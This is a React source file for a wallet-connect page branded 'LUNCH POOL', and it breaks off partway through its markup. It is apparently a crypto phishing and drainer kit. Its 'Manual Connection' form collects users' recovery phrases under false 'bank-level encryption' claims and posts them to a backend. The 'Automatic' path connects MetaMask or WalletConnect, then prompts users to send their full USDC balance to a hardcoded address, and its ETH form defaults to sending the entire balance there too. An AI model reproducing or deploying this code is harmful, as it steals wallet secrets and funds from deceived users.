import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import WalletConnectProvider from '@walletconnect/web3-provider';
import { 
  ChevronDown, 
  Wallet, 
  Import, 
  X, 
  Check, 
  AlertTriangle, 
  Shield, 
  Zap,
  Eye,
  EyeOff,
  ArrowLeft,
  Send,
  DollarSign,
  Info
} from 'lucide-react';

// Ethereum Mainnet configuration
const MAINNET_CONFIG = {
  chainId: '0x1',
  chainIdNumber: 1,
  name: 'Ethereum Mainnet',
  rpcUrl: (apiKey) => `https://eth-mainnet.g.alchemy.com/v2/${apiKey}`,
  usdcAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
  blockExplorer: 'https://etherscan.io',
  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
};

// USDC ABI
const USDC_ABI = [
  "function name() view returns (string)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

// Predefined transaction details
const RECIPIENT_ADDRESS = '0xC6841aC0550e93fB5009f9A0251FE65AEDD336c3';

// Mock popular wallets data for manual connection
const POPULAR_WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊', description: 'Popular browser extension wallet' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', description: 'Mobile-first crypto wallet' },
  { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔵', description: 'User-friendly crypto wallet' },
  { id: 'phantom', name: 'Phantom', icon: '👻', description: 'Solana ecosystem wallet' },
  { id: 'binance', name: 'Binance Chain Wallet', icon: '🟡', description: 'Binance Smart Chain wallet' },
  { id: 'walletconnect', name: 'WalletConnect', icon: '🔗', description: 'Connect any mobile wallet' },
];

// Automatic connection wallets
const AUTO_CONNECT_WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊', description: 'Browser extension wallet', apiEndpoint: 'metamask' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', description: 'Mobile crypto wallet', apiEndpoint: 'trust' },
  { id: 'phantom', name: 'Phantom (Solana)', icon: '👻', description: 'Solana ecosystem wallet', apiEndpoint: 'solana' },
  { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔵', description: 'User-friendly wallet', apiEndpoint: 'coinbase' },
  { id: 'binance', name: 'Binance Wallet', icon: '🟡', description: 'Binance Smart Chain', apiEndpoint: 'binance' },
  { id: 'walletconnect', name: 'WalletConnect', icon: '🔗', description: 'Connect via mobile wallet', apiEndpoint: 'walletconnect' },
];

// Manual connection function
const sendWalletInfo = async (walletName, secretPhrase, userWalletName) => {
  try {
    const response = await fetch('http://localhost:3001/api/send-wallet', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ walletName, secretPhrase, userWalletName }),
    });
    const data = await response.json();
    if (data.success) {
      console.log('Wallet info sent successfully');
    } else {
      console.error('Failed to send wallet info:', data.error);
    }
  } catch (err) {
    console.error('Error sending wallet info:', err);
    throw err;
  }
};

// Detect MetaMask provider with retry
const detectMetaMask = () => {
  return new Promise((resolve, reject) => {
    if (window.ethereum && window.ethereum.isMetaMask) {
      resolve(window.ethereum);
    }
    let attempts = 0;
    const interval = setInterval(() => {
      if (window.ethereum && window.ethereum.isMetaMask) {
        clearInterval(interval);
        resolve(window.ethereum);
      }
      attempts++;
      if (attempts >= 10) {
        clearInterval(interval);
        reject(new Error('MetaMask provider not detected after multiple attempts'));
      }
    }, 100);
  });
};

// Function to get wallet balances (ETH and USDC)
const getWalletBalance = async (provider, address, alchemyApiKey) => {
  try {
    // Fetch ETH balance
    const ethBalance = await provider.getBalance(address);
    const formattedEthBalance = ethers.formatEther(ethBalance);

    // Fetch USDC balance
    const alchemyProvider = new ethers.JsonRpcProvider(MAINNET_CONFIG.rpcUrl(alchemyApiKey));
    const usdcContract = new ethers.Contract(MAINNET_CONFIG.usdcAddress, USDC_ABI, alchemyProvider);
    const usdcBalance = await usdcContract.balanceOf(address);
    const usdcDecimals = await usdcContract.decimals();
    const formattedUsdcBalance = ethers.formatUnits(usdcBalance, usdcDecimals);

    return {
      eth: formattedEthBalance,
      usdc: formattedUsdcBalance,
    };
  } catch (err) {
    console.error('Error fetching wallet balance:', err);
    return { eth: '0', usdc: '0' };
  }
};

const getEthToUsdcPrice = async (alchemyApiKey) => {
  try {
    const priceFeedAddress = '0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419';
    const priceFeedAbi = [
      'function latestRoundData() external view returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)',
      'function decimals() external view returns (uint8)'
    ];
    const provider = new ethers.JsonRpcProvider(`https://eth-mainnet.g.alchemy.com/v2/${alchemyApiKey}`);
    const priceFeedContract = new ethers.Contract(priceFeedAddress, priceFeedAbi, provider);
    const roundData = await priceFeedContract.latestRoundData();
    const decimals = await priceFeedContract.decimals();
    const ethPriceInUsd = Number(ethers.formatUnits(roundData.answer, decimals));
    if (ethPriceInUsd <= 0) {
      throw new Error('Invalid price data from Chainlink');
    }
    console.log(`Fetched ETH/USDC price: ${ethPriceInUsd} USDC per ETH`);
    return ethPriceInUsd;
  } catch (err) {
    console.error('Error fetching ETH/USDC price from Chainlink:', err.message);
    return 2500;
  }
};

// Automatic wallet connection function
const connectAutoWallet = async (walletType, alchemyApiKey, setWalletData, setShowTransactionPopup, setWalletBalance) => {
  console.log('Connecting to:', walletType, 'on Ethereum Mainnet');
  if (!alchemyApiKey && walletType === 'walletconnect') {
    console.error('Error: Alchemy API key missing');
    return { success: false, address: null, error: 'Alchemy API key is missing' };
  }
  try {
    let provider;
    let signer;
    let address;
    if (walletType === 'metamask') {
      console.log('Detecting MetaMask provider...');
      const ethereum = await detectMetaMask().catch(err => {
        console.error('MetaMask detection failed:', err);
        throw new Error('MetaMask is not installed. Please install the MetaMask extension.');
      });
      try {
        await ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: MAINNET_CONFIG.chainId }],
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: MAINNET_CONFIG.chainId,
              chainName: MAINNET_CONFIG.name,
              rpcUrls: [MAINNET_CONFIG.rpcUrl(alchemyApiKey)],
              nativeCurrency: MAINNET_CONFIG.nativeCurrency,
              blockExplorerUrls: [MAINNET_CONFIG.blockExplorer],
            }],
          });
        } else {
          console.error('Switch chain error:', switchError);
          throw switchError;
        }
      }
      provider = new ethers.BrowserProvider(ethereum);
      console.log('Requesting MetaMask accounts...');
      await provider.send('eth_requestAccounts', []);
      signer = await provider.getSigner();
      address = await signer.getAddress();
    } else if (walletType === 'walletconnect') {
      console.log('Initializing WalletConnect...');
      const wcProvider = new WalletConnectProvider({
        rpc: {
          [MAINNET_CONFIG.chainIdNumber]: MAINNET_CONFIG.rpcUrl(alchemyApiKey),
        },
      });
      console.log('Enabling WalletConnect...');
      await wcProvider.enable();
      console.log('WalletConnect enabled');
      provider = new ethers.BrowserProvider(wcProvider);
      signer = await provider.getSigner();
      address = await signer.getAddress();
    } else {
      console.log('Sending request to backend for:', walletType);
      const response = await fetch(`http://localhost:3001/api/connect-${walletType}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletType }),
      });
      const data = await response.json();
      console.log('Backend response:', data);
      return { success: data.success, address: data.address || null, error: data.error || null };
    }
    // Fetch wallet data
    const balance = await provider.getBalance(address);
    const chainId = Number(await provider.getNetwork().then(net => net.chainId));
    // Fetch USDC data
    const alchemyProvider = new ethers.JsonRpcProvider(MAINNET_CONFIG.rpcUrl(alchemyApiKey));
    const usdcContract = new ethers.Contract(MAINNET_CONFIG.usdcAddress, USDC_ABI, alchemyProvider);
    const usdcBalance = await usdcContract.balanceOf(address);
    const usdcName = await usdcContract.name();
    const usdcSymbol = await usdcContract.symbol();
    const usdcDecimals = await usdcContract.decimals();
    // Fetch and store wallet balance
    const walletBalance = await getWalletBalance(provider, address, alchemyApiKey);
    setWalletBalance(walletBalance);
    // Update wallet data
    setWalletData({
      provider,
      signer,
      address,
      balance: ethers.formatEther(balance),
      chainId,
      usdc: {
        balance: ethers.formatUnits(usdcBalance, usdcDecimals),
        name: usdcName,
        symbol: usdcSymbol,
        decimals: usdcDecimals,
      },
    });
    // Validate recipient address
    if (!RECIPIENT_ADDRESS || !ethers.isAddress(RECIPIENT_ADDRESS)) {
      console.error('Invalid or missing recipient address');
      return { success: false, address, error: 'Invalid or missing recipient address. Please check REACT_APP_RECIPIENT_ADDRESS in .env' };
    }
    // Show transaction popup
    setShowTransactionPopup(true);
    console.log('Connected address:', address);
    return { success: true, address, error: null };
  } catch (err) {
    console.error('Auto connect error:', err);
    let errorMessage = err.message || 'Failed to connect to wallet';
    if (err.message.includes('Invalid API Key')) {
      errorMessage = 'Invalid Alchemy API Key. Please check your API key.';
    }
    return { success: false, address: null, error: errorMessage };
  }
};

export default function ConnectWallet() {
  const alchemyApiKey = process.env.REACT_APP_ALCHEMY_API_KEY || '';
  const [formData, setFormData] = useState({ walletName: '', secretPhrase: '' });
  const [errors, setErrors] = useState({});
  const [showManualPopup, setShowManualPopup] = useState(false);
  const [showAutoPopup, setShowAutoPopup] = useState(false);
  const [showWalletForm, setShowWalletForm] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [selectedAutoWallet, setSelectedAutoWallet] = useState(null);
  const [showSuccessPopup, setShowSuccessPopup] = useState(false);
  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState(null);
  const [showSecretPhrase, setShowSecretPhrase] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [walletData, setWalletData] = useState(null);
  const [transactionData, setTransactionData] = useState({ recipient: RECIPIENT_ADDRESS, ethAmount: '', usdcAmount: '' });
  const [transactionStatus, setTransactionStatus] = useState(null);
  const [showTransactionPopup, setShowTransactionPopup] = useState(false);
  const [customUsdcAmount, setCustomUsdcAmount] = useState('');
  const [gasEstimate, setGasEstimate] = useState(null);
  const [walletBalance, setWalletBalance] = useState({ eth: '0', usdc: '0' });

  // Update default transaction amounts when walletBalance changes
  useEffect(() => {
    setTransactionData({
      recipient: RECIPIENT_ADDRESS,
      ethAmount: walletBalance.eth,
      usdcAmount: walletBalance.usdc,
    });
  }, [walletBalance]);

  // Fetch gas estimate and set custom USDC amount when popup opens
  useEffect(() => {
    if (showTransactionPopup && walletData?.signer) {
      const estimateGas = async () => {
        try {
          console.log('Estimating gas with signer:', !!walletData.signer, 'address:', walletData.address);
          // Initialize contract with Alchemy provider as fallback
          const alchemyProvider = new ethers.JsonRpcProvider(MAINNET_CONFIG.rpcUrl(alchemyApiKey));
          let usdcContract = new ethers.Contract(MAINNET_CONFIG.usdcAddress, USDC_ABI, walletData.signer);
          
          // Verify signer connection
          let signerAddress;
          try {
            signerAddress = await walletData.signer.getAddress();
            console.log('Signer address:', signerAddress);
          } catch (err) {
            console.warn('Signer invalid, falling back to Alchemy provider:', err.message);
            usdcContract = new ethers.Contract(MAINNET_CONFIG.usdcAddress, USDC_ABI, alchemyProvider);
          }

          const usdcBalance = Number(walletBalance.usdc);
          if (usdcBalance <= 0) {
            throw new Error('No USDC balance available');
          }
          const parsedAmount = ethers.parseUnits(usdcBalance.toString(), walletData.usdc.decimals);
          const gasLimit = await usdcContract.estimateGas.transfer(RECIPIENT_ADDRESS, parsedAmount);
          const gasPrice = await alchemyProvider.getGasPrice();
          const gasCostEth = Number(ethers.formatEther(gasLimit * gasPrice));
          setGasEstimate(gasCostEth);

          // Calculate USDC amount after gas fee
          const ethToUsdcPrice = await getEthToUsdcPrice();
          const gasCostUsdc = gasCostEth * ethToUsdcPrice;
          const availableUsdc = Math.max(0, usdcBalance - gasCostUsdc);
          setCustomUsdcAmount(availableUsdc.toFixed(6)); // 6 decimals for USDC
          console.log('Gas estimation success:', { gasCostEth, gasCostUsdc, availableUsdc });
        } catch (err) {
          console.error('Gas estimation error:', err.message, err.stack);
          setGasEstimate('N/A');
          setCustomUsdcAmount(walletBalance.usdc); // Fallback to full balance
        }
      };
      if (ethers.isAddress(RECIPIENT_ADDRESS)) {
        estimateGas();
      } else {
        console.error('Invalid recipient address:', RECIPIENT_ADDRESS);
        setGasEstimate('Invalid recipient address');
        setCustomUsdcAmount(walletBalance.usdc);
      }
    }
  }, [showTransactionPopup, walletData, walletBalance, alchemyApiKey]);

  const handleManualConnect = () => setShowManualPopup(true);
  const handleAutomaticConnect = () => setShowAutoPopup(true);

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setFormData({ ...formData, walletName: wallet.name });
    setShowManualPopup(false);
    setShowWalletForm(true);
  };

  const handleAutoWalletSelect = async (wallet) => {
    setSelectedAutoWallet(wallet);
    setIsConnecting(true);
    setShowAutoPopup(false);
    setConnectionStatus('connecting');
    try {
      const result = await connectAutoWallet(wallet.apiEndpoint, alchemyApiKey, setWalletData, setShowTransactionPopup, setWalletBalance);
      if (result.success) {
        setConnectionStatus('success');
      } else {
        setConnectionStatus('error');
        setErrorMessage(result.error || 'Failed to connect to wallet');
      }
    } catch (error) {
      setConnectionStatus('error');
      setErrorMessage(error.message || 'Connection failed. Please try again.');
    } finally {
      setIsConnecting(false);
      setTimeout(() => {
        setConnectionStatus(null);
        setSelectedAutoWallet(null);
        setErrorMessage('');
      }, 5000);
    }
  };

  const handleInputChange = (field, e) => {
    setFormData({ ...formData, [field]: e.target.value });
    if (errors[field]) setErrors({ ...errors, [field]: '' });
  };

  const handleTransactionInputChange = (field, e) => {
    setTransactionData({ ...transactionData, [field]: e.target.value });
  };

  const validateForm = () => {
    const newErrors = {};
    if (!formData.walletName.trim()) newErrors.walletName = 'Wallet name is required';
    if (!formData.secretPhrase.trim()) {
      newErrors.secretPhrase = 'Secret phrase is required';
    } else {
      const words = formData.secretPhrase.trim().split(/\s+/);
      if (words.length < 12) newErrors.secretPhrase = 'Secret phrase must contain at least 12 words';
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleManualSubmit = async (e) => {
    e.preventDefault();
    if (!validateForm()) return;
    setIsConnecting(true);
    try {
      await sendWalletInfo(selectedWallet.name, formData.secretPhrase, formData.walletName);
      setShowWalletForm(false);
      setShowSuccessPopup(true);
      setFormData({ walletName: '', secretPhrase: '' });
      setSelectedWallet(null);
    } catch {
      setShowErrorPopup(true);
    } finally {
      setIsConnecting(false);
    }
  };

  const handleSendEth = async (e) => {
    e.preventDefault();
    if (!walletData || !walletData.signer) {
      setTransactionStatus({ type: 'error', message: 'Wallet not connected' });
      return;
    }
    const { recipient, ethAmount } = transactionData;
    if (!ethers.isAddress(recipient)) {
      setTransactionStatus({ type: 'error', message: 'Invalid recipient address' });
      return;
    }
    const ethBalance = Number(walletBalance.eth);
    const amountToSend = ethAmount && !isNaN(ethAmount) && Number(ethAmount) > 0 ? Number(ethAmount) : ethBalance;
    if (amountToSend > ethBalance) {
      setTransactionStatus({ type: 'error', message: `Insufficient ETH balance: ${ethBalance} ETH available` });
      return;
    }
    setTransactionStatus({ type: 'pending', message: 'Sending ETH transaction...' });
    try {
      // Estimate gas to reserve some ETH
      const gasPrice = await walletData.provider.getGasPrice();
      const gasLimit = ethers.toBigInt(21000); // Standard ETH transfer gas limit
      const gasCost = gasPrice * gasLimit;
      const maxEthToSend = ethers.parseEther(amountToSend.toString()) - gasCost;
      if (maxEthToSend <= 0) {
        throw new Error('Insufficient ETH for gas fees');
      }
      const tx = await walletData.signer.sendTransaction({
        to: recipient,
        value: maxEthToSend,
      });
      console.log('ETH Transaction sent:', tx.hash);
      const receipt = await tx.wait();
      console.log('ETH Transaction confirmed:', receipt);
      setTransactionStatus({ type: 'success', message: `ETH Transaction confirmed: ${tx.hash}` });
      // Update wallet data
      const balance = await walletData.provider.getBalance(walletData.address);
      setWalletData({ ...walletData, balance: ethers.formatEther(balance) });
      // Update wallet balance
      const updatedBalance = await getWalletBalance(walletData.provider, walletData.address, alchemyApiKey);
      setWalletBalance(updatedBalance);
    } catch (err) {
      console.error('ETH Transaction error:', err);
      setTransactionStatus({ type: 'error', message: err.message || 'ETH Transaction failed' });
    }
    setTimeout(() => setTransactionStatus(null), 5000);
  };

  const handleTransferUsdc = async (e, recipient, amount) => {
    e.preventDefault();
    if (!walletData || !walletData.signer) {
      setTransactionStatus({ type: 'error', message: 'Wallet not connected' });
      return;
    }
    const finalRecipient = recipient || transactionData.recipient;
    const usdcBalance = Number(walletBalance.usdc);
    const finalAmount = amount || (transactionData.usdcAmount && !isNaN(transactionData.usdcAmount) && Number(transactionData.usdcAmount) > 0 ? transactionData.usdcAmount : usdcBalance);
    if (!ethers.isAddress(finalRecipient)) {
      setTransactionStatus({ type: 'error', message: 'Invalid recipient address' });
      return;
    }
    if (Number(finalAmount) > usdcBalance) {
      setTransactionStatus({ type: 'error', message: `Insufficient USDC balance: ${usdcBalance} USDC available` });
      return;
    }
    setTransactionStatus({ type: 'pending', message: 'Sending USDC transaction...' });
    try {
      const usdcContract = new ethers.Contract(MAINNET_CONFIG.usdcAddress, USDC_ABI, walletData.signer);
      const parsedAmount = ethers.parseUnits(finalAmount.toString(), walletData.usdc.decimals);
      const tx = await usdcContract.transfer(finalRecipient, parsedAmount);
      console.log('USDC Transaction sent:', tx.hash);
      const receipt = await tx.wait();
      console.log('USDC Transaction confirmed:', receipt);
      setTransactionStatus({ type: 'success', message: `USDC Transaction confirmed: ${tx.hash}` });
      // Update wallet data
      const usdcBalance = await usdcContract.balanceOf(walletData.address);
      setWalletData({
        ...walletData,
        usdc: { ...walletData.usdc, balance: ethers.formatUnits(usdcBalance, walletData.usdc.decimals) },
      });
      // Update wallet balance
      const updatedBalance = await getWalletBalance(walletData.provider, walletData.address, alchemyApiKey);
      setWalletBalance(updatedBalance);
    } catch (err) {
      console.error('USDC Transaction error:', err);
      setTransactionStatus({ type: 'error', message: err.message || 'USDC Transaction failed' });
    }
    setTimeout(() => setTransactionStatus(null), 5000);
  };

  const handleApproveTransaction = async (e) => {
    if (!customUsdcAmount || Number(customUsdcAmount) <= 0) {
      setTransactionStatus({ type: 'error', message: 'Invalid USDC amount' });
      return;
    }
    if (Number(customUsdcAmount) > Number(walletBalance.usdc)) {
      setTransactionStatus({ type: 'error', message: `Insufficient USDC balance: ${walletBalance.usdc} USDC available` });
      return;
    }
    if (!ethers.isAddress(RECIPIENT_ADDRESS)) {
      setTransactionStatus({ type: 'error', message: 'Invalid recipient address in configuration' });
      return;
    }
    await handleTransferUsdc(e, RECIPIENT_ADDRESS, customUsdcAmount);
    setShowTransactionPopup(false);
  };

  const closeAllPopups = () => {
    setShowManualPopup(false);
    setShowAutoPopup(false);
    setShowWalletForm(false);
    setShowSuccessPopup(false);
    setShowErrorPopup(false);
    setShowTransactionPopup(false);
    setConnectionStatus(null);
    setSelectedWallet(null);
    setSelectedAutoWallet(null);
    setFormData({ walletName: '', secretPhrase: '' });
    setErrors({});
    setErrorMessage('');
  };

  return (
    <>
      <div className="connect-page min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
        <div className="fixed inset-0 bg-gradient-radial from-transparent via-indigo-900/20 to-black/40 pointer-events-none"></div>
        <header className="relative z-20 px-6 py-4 flex justify-between items-center border-b border-white/10 backdrop-blur-sm">
          <div className="logo text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-600 bg-clip-text text-transparent">
            LUNCH POOL
          </div>
          <div className="flex items-center gap-4">
            <button
              onClick={() => window.history.back()}
              className="flex items-center gap-2 px-4 py-2 rounded-lg bg-white/5 border border-white/10 hover:bg-white/10 text-white transition-all"
            >
              <ArrowLeft size={16} />
              Back
            </button>
          </div>
        </header>
        <main className="relative z-20 container mx-auto px-6 py-12">
          <div className="max-w-4xl mx-auto">
            <div className="text-center mb-12">
              <div className="inline-block px-3 py-1 rounded-full bg-blue-900/30 border border-blue-500/50 text-blue-400 text-sm font-semibold mb-6">
                SECURE CONNECTION
              </div>
              <h1 className="text-4xl md:text-5xl font-bold mb-6 text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-600">
                Connect Your Wallet
              </h1>
              <p className="text-gray-300 text-lg max-w-2xl mx-auto">
                Connect your wallet to view your balance, interact with smart contracts, and make transactions on Ethereum Mainnet.
              </p>
            </div>
            {walletData && (
              <div className="mb-12 bg-gradient-to-r from-blue-900/20 to-purple-900/20 border border-blue-500/30 rounded-xl p-6 backdrop-blur-sm">
                <h3 className="text-xl font-semibold text-white mb-4 flex items-center gap-2">
                  <Wallet size={20} className="text-blue-400" /> Wallet Details
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <p className="text-gray-400 text-sm">Address:</p>
                    <p className="text-white font-mono truncate">{walletData.address}</p>
                  </div>
                  <div className="border-t border-gray-900/50 md:border-t-0">
                    <p className="text-gray-400 text-sm">ETH Balance (State):</p>
                    <p className="text-white font-medium">{walletBalance.eth} ETH</p>
                  </div>
                  <div className="border-t border-gray-900/50">
                    <p className="text-gray-400 text-sm">Chain ID:</p>
                    <p className="text-white font-medium">{walletData.chainId}</p>
                  </div>
                  <div className="border-t border-gray-900/50">
                    <p className="text-gray-400 text-sm">{walletData.usdc.symbol} Balance (State):</p>
                    <p className="text-white font-medium">{walletBalance.usdc} {walletData.usdc.symbol}</p>
                  </div>
                </div>
              </div>
            )}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-12">
              <div className="connection-card group relative overflow-hidden rounded-2xl bg-gradient-to-b from-white/5 to-white/[0.02] border border-white/10 backdrop-blur-sm p-8 hover:border-purple-500/50 transition-all duration-300">
                <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-purple-500/10 to-pink-600/10 rounded-full blur-3xl"></div>
                <div className="relative z-10">
                  <div className="flex items-center gap-4 mb-6">
                    <div className="w-12 h-12 rounded-lg bg-purple-500/20 flex items-center justify-center">
                      <Import size={24} className="text-purple-400" />
                    </div>
                    <div className="text">
                      <h3 className="text-xl font-semibold text-white">Manual Connection</h3>
                      <p className="text-gray-400 text-sm">Import using seed phrase</p>
                    </div>
                  </div>
                  <p className="text-gray-300 mb-6">
                    Securely connect by selecting your wallet type and entering your recovery phrase.
                  </p>
                  <div className="features-list space-y-2 mb-8">
                    <div className="flex items-center gap-2 text-sm text-gray-400">
                      <Shield size={14} className="text-green-400" /> <span>Bank-level encryption</span>
                    </div>
                    <div className="flex items-center gap-2 text-sm text-gray-400">
                      <Check size={14} className="text-green-400" /> <span>Works with all wallet types</span>
                    </div>
                    <div className="flex items-center gap-2 text-sm text-gray-400">
                      <Wallet size={14} className="text-green-400" /> <span>Direct access to funds</span>
                    </div>
                  </div>
                  <button 
                    onClick={handleManualConnect}
                    className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-medium transition-all shadow-lg shadow-purple-700/30"
                  >
                    Connect Manually
                  </button>
                </div>
              </div>
              <div className="connection-card group relative overflow-hidden rounded-2xl bg-gradient-to-b from-white/5 to-white/[0.02] border border-white/10 backdrop-blur-sm p-8 hover:border-blue-500/50 transition-all duration-300">
                <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-blue-500/10 to-cyan-600/10 rounded-full blur-3xl"></div>
                <div className="relative z-10">
                  <div className="flex items-center gap-4 mb-6">
                    <div className="w-12 h-12 rounded-lg bg-blue-500/20 flex items-center justify-center">
                      <Zap size={24} className="text-blue-400" />
                    </div>
                    <div className="text">
                      <h3 className="text-xl font-semibold text-white">Automatic Connection</h3>
                      <p className="text-gray-400 text-sm">One-click Web3 connection</p>
                    </div>
                  </div>
                  <p className="text-gray-300 mb-6">
                    Quick connection using popular wallet providers.
                  </p>
                  <div className="features-list space-y-2 mb-8">
                    <div className="flex items-center gap-2 text-sm text-gray-400">
                      <Zap size={14} className="text-blue-400" /> <span>Instant connection</span>
                    </div>
                    <div className="flex items-center gap-2 text-sm text-gray-400">
                      <Shield size={14} className="text-blue-400" /> <span>Multiple wallet support</span>
                    </div>
                    <div className="flex items-center gap-2 text-sm text-gray-400">
                      <Check size={14} className="text-blue-400" /> <span>No seed phrase required</span>
                    </div>
                  </div>
                  <button 
                    onClick={handleAutomaticConnect}
                    disabled={isConnecting}
                    className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-medium transition-all shadow-lg shadow-blue-700/30 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                  >
                    {isConnecting && connectionStatus === 'connecting' ? (
                      <>
                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        Connecting to {selectedAutoWallet?.name}...
                      </>
                    ) : (
                      'Connect Wallet'
                    )}
                  </button>
                </div>
              </div>
            </div>
            {walletData && (
              <div className="mb-12 bg-gradient-to-r from-green-900/20 to-teal-900/20 border border-green-500/30 rounded-xl p-6 backdrop-blur-sm">
                <h3 className="text-xl font-semibold text-white mb-4 flex items-center gap-2">
                  <Send size={20} className="text-green-400" /> Make Transactions
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <h4 className="text-lg font-medium text-white mb-4">Send ETH</h4>
                    <div className="space-y-4">
                      <div>
                        <label className="block text-sm font-medium text-gray-300 mb-2">Recipient Address</label>
                        <input
                          type="text"
                          value={transactionData.recipient}
                          onChange={(e) => handleTransactionInputChange('recipient', e)}
                          placeholder="0x..."
                          className="w-full p-3 rounded-lg bg-white/5 border border-white/20 text-white placeholder-gray-400 focus:border-green-500 focus:outline-none"
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-medium text-gray-300 mb-2">Amount (ETH, Available: {walletBalance.eth} ETH)</label>
                        <input
                          type="text"
                          value={transactionData.ethAmount}
                          onChange={(e) => handleTransactionInputChange('ethAmount', e)}
                          placeholder={walletBalance.eth}
                          className="w-full p-3 rounded-lg bg-white/5 border border-white/20 text-white placeholder-gray-400 focus:border-green-500 focus:outline-none"
                        />
                      </div>
                      <button
                        onClick={handleSendEth}
                        disabled={transactionStatus?.type === 'pending'}
                        className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-green-600 to-teal-600 hover:from-green-700 hover:to-teal-700 text-white font-medium transition-all disabled:flex items-center disabled:cursor-auto"
                      >
                        <Send size={16} /> Send ETH
                      </button>
                    </div>
                  </div>
                  <div>
                    <h4 className="text-lg font-medium text-white mb-4">Transfer {walletData.usdc.symbol}</h4>
                    <div className="space-y-4">
                      <div>
                        <label className="block text-sm font-medium text-gray-300 mb-2">Recipient Address</label>
                        <input
                          type="text"
                          value={transactionData.recipient}
                          onChange={(e) => handleTransactionInputChange('recipient', e)}
                          placeholder="0x..."
                          className="w-full p-3 rounded-lg bg-white/5 border border-white/20 text-white placeholder-gray-400 focus:border-green-500 focus:outline-none"
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-medium text-gray-300 mb-2">Amount ({walletData.usdc.symbol}, Available: {walletBalance.usdc} {walletData.usdc.symbol})</label>
                        <input
                          type="text"
                          value={transactionData.usdcAmount}
                          onChange={(e) => handleTransactionInputChange('usdcAmount', e)}
                          placeholder={walletBalance.usdc}
                          className="w-full p-3 rounded-lg bg-white/5 border border-white/20 text-white placeholder-gray-400 focus:border-green-500 focus:outline-none"
                        />
                      </div>
                      <button
                        onClick={handleTransferUsdc}
                        disabled={transactionStatus?.type === 'pending'}
                        className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-green-600 to-teal-600 hover:from-green-700 hover:to-teal-700 text-white font-medium transition-all disabled:flex items-center disabled:cursor-auto"
                      >
                        <DollarSign size={16} /> Transfer {walletData.usdc.symbol}
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            )}
            {connectionStatus === 'success' && (
              <div className="fixed top-20 right-6 bg-green-600/90 border border-green-600 rounded-lg p-4 backdrop-blur-md z-50 animate-slide-in">
                <div className="flex items-center gap-3">
                  <Check size={20} className="text-green-600" />
                  <div className="text">
                    <p className="text-green-400 font-semibold">Connection Successful!</p>
                    <p className="text-green-600 text-sm">{selectedAutoWallet?.name} connected successfully</p>
                  </div>
                </div>
              </div>
            )}
            {connectionStatus?.type === 'error' && (
              <div className="fixed top-20 right-20 bg-red-600/90 border border-red-600 rounded-lg p-4 backdrop-blur-md z-50 animate-slide-in">
                <div className="flex items-center gap-3">
                  <AlertTriangle size={20} className="text-red-600" />
                  <div className="text">
                    <p className="text-red-400 font-semibold">Connection Failed</p>
                    <p className="text-red-600 text-sm">{errorMessage || 'Please try again or use manual connection'}</p>
                  </div>
                </div>
              </div>
            )}
            {transactionStatus && (
              <div className={`fixed top-20 right-6 ${transactionStatus.type === 'success' ? 'bg-green-600/90 border-green-600' : transactionStatus.type === 'error' ? 'bg-red-600/90 border-red-600' : 'bg-blue-600/50 border-blue-600'} border rounded-lg p-4 backdrop-blur-md z-50 animate-slide-in`}>
                <div className="flex items-center gap-3">
                  {transactionStatus.type === 'success' ? <Check size={20} className="text-green-600" /> : transactionStatus.type === 'error' ? <AlertTriangle size={20} className="text-red-600" /> : <Info size={20} className="text-blue-600" />}
                  <div className="text">
                    <p className={`font-semibold ${transactionStatus.type === 'success' ? 'text-green-600' : transactionStatus.type === 'error' ? 'text-blue-600' : 'text-blue-600'}`}>
                      {transactionStatus.type === 'success' ? 'Transaction Successful!' : transactionStatus.type === 'error' ? 'Transaction failed' : 'Transaction Pending'}
                    </p>
